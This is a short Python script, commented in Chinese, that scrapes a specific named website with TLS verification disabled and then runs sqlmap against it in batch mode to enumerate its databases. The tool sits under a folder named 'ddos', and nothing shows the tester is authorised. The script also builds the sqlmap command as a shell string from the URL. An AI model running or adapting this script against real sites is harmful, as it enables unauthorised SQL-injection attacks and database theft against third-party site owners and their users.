import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
import chardet
import subprocess
import os

# 禁用 InsecureRequestWarning 警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 创建自定义的 HTTP 适配器
class SSLAdapter(HTTPAdapter):
    def __init__(self, ssl_context=None, **kwargs):
        self.ssl_context = ssl_context
        super().__init__(**kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = self.ssl_context
        return super().init_poolmanager(*args, **kwargs)

# 创建自定义的 SSL 上下文
ssl_context = ssl.create_default_context()
ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')  # 设置较低的安全等级以支持更多的旧协议

# 禁用特定的 SSL/TLS 版本
ssl_context.options |= ssl.OP_NO_TLSv1  # 禁用 TLSv1
ssl_context.options |= ssl.OP_NO_TLSv1_1  # 禁用 TLSv1.1

def test_http(url):
    session = requests.Session()
    session.mount('https://', SSLAdapter(ssl_context))
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': '*',  # 接受任何语言
        'Referer': 'https://www.google.com',

    }
    try:
        response = session.get(url, headers=headers, verify=False)  # 禁用 SSL 证书验证
        print(f"Status Code: {response.status_code}")
        if response.status_code == 200:
            detected_encoding = chardet.detect(response.content)['encoding']
            response.encoding = detected_encoding
            soup = BeautifulSoup(response.text, 'html.parser')
            print(f"Page Title: {soup.title.string}")
            for link in soup.find_all('a'):
                print(f"Link: {link.get('href')}")
        else:
            print("Failed to retrieve the page.")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def test_sql_injection(url):
    # 确保 sqlmap_path 指向 sqlmap.py 文件的正确位置
    sqlmap_path = os.path.abspath('C:/ddos/sqlmap/sqlmap.py')  # 使用绝对路径
    sqlmap_command = f'py {sqlmap_path} -u "{url}" --batch --dbs'
    print(f"Running SQLmap command: {sqlmap_command}")  # 添加调试信息
    try:
        process = subprocess.Popen(sqlmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate(timeout=60)  # 设置超时时间
        print("SQLmap output:")
        print(stdout.decode())
        if stderr:
            print("SQLmap errors:")
            print(stderr.decode())
        print("SQLmap errors:")
        print(stderr.decode())
    except subprocess.TimeoutExpired:
        process.kill()
        print("SQLmap command timed out")
    except Exception as e:
        print(f"Error running sqlmap: {e}")

def main():
    target_url = 'https://www.biqooge.com'
    
    # HTTP 测试
    print("Testing HTTP...")
    test_http(target_url)
    
    # SQL 注入测试
    print("Testing SQL Injection...")
    test_sql_injection(f'{target_url}')

if __name__ == "__main__":
    main()
